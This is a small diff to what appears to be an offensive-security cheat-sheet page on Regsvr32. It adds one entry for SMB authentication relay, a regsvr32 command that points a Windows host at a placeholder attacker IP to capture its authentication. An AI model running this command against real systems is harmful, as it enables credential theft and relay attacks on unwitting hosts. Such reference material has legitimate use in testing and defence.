@@ -1,5 +1,11 @@
 # Regsvr32
 
+Execute command to perform SMB authentication relay.
+
+```
+C:\> regsvr32.exe /s /u /i://<attacker_IP>/@snare scrobj.dll
+```
+
 ---
 ## References
 
